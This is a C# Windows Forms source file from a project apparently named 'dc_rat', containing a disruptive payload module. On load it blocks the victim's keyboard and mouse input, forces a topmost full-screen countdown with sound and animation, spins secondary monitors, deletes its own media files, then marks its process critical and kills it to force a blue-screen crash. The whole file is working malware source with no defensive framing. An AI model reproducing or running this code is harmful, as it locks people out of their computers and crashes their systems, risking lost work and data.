using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace dc_rat
{
    public partial class Form1 : Form
    {
        #region bsod
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
        #endregion

        #region input
        public static class NativeMethods
        {
            [System.Runtime.InteropServices.DllImportAttribute("user32.dll", EntryPoint = "BlockInput")]
            [return: System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)]
            public static extern bool BlockInput([System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)] bool fBlockIt);
        }
        #endregion

        System.Media.SoundPlayer player = new System.Media.SoundPlayer($"C:\\Users\\{Environment.UserName}\\Downloads\\countdown.wav");
        bool rotate = true;

        public Form1()
        {
            InitializeComponent();
            var pos = this.PointToScreen(label1.Location);
            pos = pictureBox1.PointToClient(pos);
            label1.Parent = pictureBox1;
            label1.Location = pos;
            label1.BackColor = Color.Transparent;
        }

        void countdown()
        {
            Thread.Sleep(18000);
            Thread _flipscreen = new Thread(flipscreen) { IsBackground = true };
            _flipscreen.Start();
            pictureBox1.ImageLocation = @$"C:\\Users\\{Environment.UserName}\\Downloads\\123.gif";
            Thread.Sleep(14000);
            label1.Show();
            for (int i = 10; i > -1; i--)
            {
                label1.Text = i.ToString();
                label1.Refresh();
                Thread.Sleep(1800);
            }
            player.Stop();
            label1.Hide();
            rotate = false;
        }

        void flipscreen()
        {
            while (rotate)
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("root\\CIMV2", "select * from Win32_PnPEntity WHERE Name LIKE '%PnP%Monitor%'");
                int screens = searcher.Get().Count;
                int primary = Convert.ToInt32(Convert.ToString(Screen.PrimaryScreen).Split('\\').Last().Replace("DISPLAY", ""));
                while (rotate)
                {
                    for (uint i = 1; i < screens + 1; i++)
                    {
                        if (i != primary)
                        {
                            Display.Rotate(i, Display.Orientations.DEGREES_CW_90);
                            Thread.Sleep(1000);
                            Display.Rotate(i, Display.Orientations.DEGREES_CW_180);
                            Thread.Sleep(1000);
                            Display.Rotate(i, Display.Orientations.DEGREES_CW_270);
                            Thread.Sleep(1000);
                            Display.Rotate(i, Display.Orientations.DEGREES_CW_0);
                            Thread.Sleep(1000);
                        }
                    }
                }
            }
            NativeMethods.BlockInput(false);
            File.Delete($"C:\\Users\\{Environment.UserName}\\Downloads\\countdown.wav");
            File.Delete($"C:\\Users\\{Environment.UserName}\\Downloads\\123.gif");

            System.Diagnostics.Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            NativeMethods.BlockInput(true);
            label1.Hide();
            Color myColor = Color.FromArgb(0, Color.Blue);
            label1.BackColor = myColor;

            this.WindowState = FormWindowState.Maximized;
            pictureBox1.Size = new Size(this.Width, this.Height);
            label1.Location = new Point((this.Width / 2) - (label1.Width / 2), this.Height - 250);
            this.TopMost = true;
            this.TopLevel = true;

            player.Play();

            Thread _countdown = new Thread(countdown) { IsBackground = true };
            _countdown.Start();
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }
    }
}
